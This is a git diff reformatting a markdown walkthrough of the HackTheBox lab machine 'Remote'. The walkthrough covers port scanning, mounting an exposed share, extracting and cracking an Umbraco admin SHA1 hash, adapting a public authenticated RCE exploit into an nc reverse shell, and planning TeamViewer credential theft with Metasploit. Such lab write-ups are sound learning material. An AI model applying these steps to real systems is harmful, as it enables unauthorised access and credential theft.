@@ -4,7 +4,7 @@ In 2020 (thanks to COVID lockdowns), I started working on HackTheBox challenges.
 
 This is not going to be a full wript-up with detailed steps, I am just going to skip over to most interesting findings. It goes without saying that there was hours of research between each stage and a lot of learning.
 
-* Starting off with an NMAP Scan:
+### Starting off with an NMAP Scan:
 
 ```
 ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.180 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
@@ -53,52 +53,54 @@ Nmap done: 1 IP address (1 host up) scanned in 84.11 seconds
 
 ```
 
-* As usual, I went through most of the well known ports to explore the attack surface:
-    - Start dirbuster on web applications
-    - Start manually browsing the web content
-    - Attempt manual connections to ftp and mountd services
-    - Fire up msfconsole and run some recon against netbios and rpc
+As usual, I went through most of the well known ports to explore the attack surface:
+- Start dirbuster on web applications
+- Start manually browsing the web content
+- Attempt manual connections to ftp and mountd services
+- Fire up msfconsole and run some recon against netbios and rpc
 
-* I hit two interesting leads in the recon:
-   - Dirbuster found bunch of content on port 80
-   
-      ```
-      GENERATED WORDS: 4612
+I hit two interesting leads in the recon:
+- Dirbuster found bunch of content on port 80
 
-      ---- Scanning URL: http://10.10.10.180/ ----
-      + http://10.10.10.180/about-us (CODE:200|SIZE:5441)
-      + http://10.10.10.180/blog (CODE:200|SIZE:5001)
-      + http://10.10.10.180/Blog (CODE:200|SIZE:5001)
-      + http://10.10.10.180/contact (CODE:200|SIZE:7880)
-      + http://10.10.10.180/Contact (CODE:200|SIZE:7880)
-      + http://10.10.10.180/home (CODE:200|SIZE:6703)
-      + http://10.10.10.180/Home (CODE:200|SIZE:6703)
-      + http://10.10.10.180/install (CODE:302|SIZE:126)
-      + http://10.10.10.180/intranet (CODE:200|SIZE:3323)
-      + http://10.10.10.180/master (CODE:500|SIZE:3420)
-      + http://10.10.10.180/people (CODE:200|SIZE:6739)
-      + http://10.10.10.180/People (CODE:200|SIZE:6739)
-      + http://10.10.10.180/person (CODE:200|SIZE:2741)
-      + http://10.10.10.180/product (CODE:500|SIZE:3420)
-      + http://10.10.10.180/products (CODE:200|SIZE:5328)
-      + http://10.10.10.180/Products (CODE:200|SIZE:5328)
-      + http://10.10.10.180/umbraco (CODE:200|SIZE:4040)
-      ```
-   - Umbraco is a CMS so I used a [Umbraco discovery wordlist](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/CMS) and discovered the login page 
-   
-      ` http://10.10.10.180/umbraco#/login/false?returnPath=%252Fumbraco`
-   - Second important discovery:
-      - I was able to mount a volume using the mountd service
-        
-        `mount 10.10.10.180:/site_backups site_backups/`
-      - It contained a directory called `App_data` with file `Umbraco.sdf`
-      - A quick google search reveals it's a database file
-      - Not sure how to open this file, I just drag and dropped it into my VSCode editor and instantly noticed a plain text string in load of garbage 
-        
-          `Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}`
-      - BAM! There it is, the SHA1 hash for the Umbraco Administrator's password. But how do I crack it?
-      - Well, I just googled how to crack SHA1 hash, in top results I see `https://crackstation.net/`, paste the hash into this website, and BAM! `baconandcheese` is the password!
-      - Login to the Umbraco CMS as admin
+  ```
+  GENERATED WORDS: 4612
+
+  ---- Scanning URL: http://10.10.10.180/ ----
+  + http://10.10.10.180/about-us (CODE:200|SIZE:5441)
+  + http://10.10.10.180/blog (CODE:200|SIZE:5001)
+  + http://10.10.10.180/Blog (CODE:200|SIZE:5001)
+  + http://10.10.10.180/contact (CODE:200|SIZE:7880)
+  + http://10.10.10.180/Contact (CODE:200|SIZE:7880)
+  + http://10.10.10.180/home (CODE:200|SIZE:6703)
+  + http://10.10.10.180/Home (CODE:200|SIZE:6703)
+  + http://10.10.10.180/install (CODE:302|SIZE:126)
+  + http://10.10.10.180/intranet (CODE:200|SIZE:3323)
+  + http://10.10.10.180/master (CODE:500|SIZE:3420)
+  + http://10.10.10.180/people (CODE:200|SIZE:6739)
+  + http://10.10.10.180/People (CODE:200|SIZE:6739)
+  + http://10.10.10.180/person (CODE:200|SIZE:2741)
+  + http://10.10.10.180/product (CODE:500|SIZE:3420)
+  + http://10.10.10.180/products (CODE:200|SIZE:5328)
+  + http://10.10.10.180/Products (CODE:200|SIZE:5328)
+  + http://10.10.10.180/umbraco (CODE:200|SIZE:4040)
+  ```
+- Umbraco is a CMS so I used a [Umbraco discovery wordlist](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/CMS) and discovered the login page 
+
+  ` http://10.10.10.180/umbraco#/login/false?returnPath=%252Fumbraco`
+- Second important discovery:
+  - I was able to mount a volume using the mountd service
+
+    `mount 10.10.10.180:/site_backups site_backups/`
+  - It contained a directory called `App_data` with file `Umbraco.sdf`
+  - A quick google search reveals it's a database file
+  - Not sure how to open this file, I just drag and dropped it into my VSCode editor and instantly noticed a plain text string in load of garbage 
+
+      `Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}`
+  - BAM! There it is, the SHA1 hash for the Umbraco Administrator's password. But how do I crack it?
+  - Well, I just googled how to crack SHA1 hash, in top results I see `https://crackstation.net/`, paste the hash into this website, and BAM! `baconandcheese` is the password!
+  - Login to the Umbraco CMS as admin
+ 
+### Umbraco Remote Code Execution
  
 * Next step is to somehow get code execution. So I re-visited exploit-db and noticed [Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/46153) exploit. The word authenticated caught my eye and I was quite sure this exploit has to work. Of course, it didn't work.
 * After bit of tinkering with the payload, I modified it to obtain a reverse shell using nc back to my kali machine:
@@ -116,8 +118,10 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
  </xsl:template> </xsl:stylesheet> '
 ```
 Got the user flag `type c:\Users\Public\user.txt`
- 
-* Now for finding privilege escalation to root, I spent too much time looking around the system and finding missing patches, etc but no luck. Hmm, the name of the machine is `remote` so there must be a remote access service that we can exploit. Did some service enumeration and found that TeamViewer is running. That's probably the way in.
+
+### Privilege Escalation
+
+Now for finding privilege escalation to root, I spent too much time looking around the system and finding missing patches, etc but no luck. Hmm, the name of the machine is `remote` so there must be a remote access service that we can exploit. Did some service enumeration and found that TeamViewer is running. That's probably the way in.
 
 * In Metasploit, I noticed `windows/gather/credentials/teamviewer_passwords` module. So I spent the time to now get a proper shell into my msfconsole. I ended up using following commands in my existing reverse shell:
 
